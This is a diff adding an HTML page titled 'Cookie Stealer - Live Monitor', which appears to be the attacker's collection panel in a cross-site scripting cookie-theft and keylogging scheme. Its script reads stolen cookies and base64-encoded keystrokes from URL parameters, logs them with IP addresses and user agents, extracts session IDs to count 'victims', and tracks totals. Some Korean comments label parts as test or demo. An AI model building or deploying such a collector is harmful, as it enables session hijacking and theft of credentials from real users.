@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <title>Cookie Collector</title>
+        <meta charset="utf-8">
+        <style>
+            body {
+                font-family: monospace;
+                background: #1a1a1a;
+                color: #0f0;
+                padding: 20px;
+            }
+            .log-entry {
+                background: #000;
+                border: 1px solid #0f0;
+                padding: 15px;
+                margin: 10px 0;
+                white-space: pre-wrap;
+                word-break: break-all;
+            }
+            h1 {
+                text-align: center;
+                color: #0f0;
+                text-shadow: 0 0 10px #0f0;
+            }
+            .stats {
+                background: #000;
+                border: 2px solid #0f0;
+                padding: 20px;
+                margin: 20px 0;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>🍪 Cookie Stealer - Live Monitor 🍪</h1>
+        
+        <div class="stats">
+            <h2>Statistics</h2>
+            <p>Total Cookies Stolen: <span id="total">0</span></p>
+            <p>Unique Victims: <span id="unique">0</span></p>
+            <p>Last Update: <span id="lastUpdate">Never</span></p>
+        </div>
+        
+        <h2>Captured Data:</h2>
+        <div id="logs"></div>
+        
+        <script>
+            // 실제 구현에서는 서버 측 로깅 필요
+            const logs = [];
+            const victims = new Set();
+            
+            // URL 파라미터에서 쿠키 추출 (테스트용)
+            function checkNewData() {
+                const params = new URLSearchParams(window.location.search);
+                const cookie = params.get('c');
+                const keylog = params.get('k');
+                
+                if (cookie) {
+                    const entry = {
+                        timestamp: new Date().toISOString(),
+                        type: 'COOKIE',
+                        data: decodeURIComponent(cookie),
+                        ip: '66.121.101.9',
+                        userAgent: navigator.userAgent
+                    };
+                    
+                    logs.push(entry);
+                    displayLog(entry);
+                    
+                    // 쿠키에서 session_id 추출
+                    const sessionMatch = cookie.match(/session_id=([^;]+)/);
+                    if (sessionMatch) {
+                        victims.add(sessionMatch[1]);
+                    }
+                    
+                    updateStats();
+                }
+                
+                if (keylog) {
+                    const entry = {
+                        timestamp: new Date().toISOString(),
+                        type: 'KEYLOG',
+                        data: atob(keylog),
+                        ip: '58.130.237.23'
+                    };
+                    
+                    logs.push(entry);
+                    displayLog(entry);
+                }
+            }
+            
+            function displayLog(entry) {
+                const logDiv = document.createElement('div');
+                logDiv.className = 'log-entry';
+                logDiv.textContent = `[${entry.timestamp}] ${entry.type}
+    IP: ${entry.ip}
+    Data: ${entry.data}
+    ${entry.userAgent ? 'User-Agent: ' + entry.userAgent : ''}`;
+                
+                document.getElementById('logs').insertBefore(
+                    logDiv, 
+                    document.getElementById('logs').firstChild
+                );
+            }
+            
+            function updateStats() {
+                document.getElementById('total').textContent = logs.length;
+                document.getElementById('unique').textContent = victims.size;
+                document.getElementById('lastUpdate').textContent = new Date().toLocaleString();
+            }
+            
+            // 실시간 모니터링 시뮬레이션
+            setInterval(() => {
+                // 실제로는 서버에서 새 데이터 확인
+                checkNewData();
+            }, 1000);
+            
+            // 초기 확인
+            checkNewData();
+            
+            // 가짜 데이터 생성 (데모용)
+            setTimeout(() => {
+                if (logs.length === 0) {
+                    const fakeEntry = {
+                        timestamp: new Date().toISOString(),
+                        type: 'DEMO',
+                        data: 'session_id=fake123; user=admin; token=abc123',
+                        ip: '192.168.1.100'
+                    };
+                    logs.push(fakeEntry);
+                    displayLog(fakeEntry);
+                    updateStats();
+                }
+            }, 3000);
+        </script>
+    </body>
+    </html>
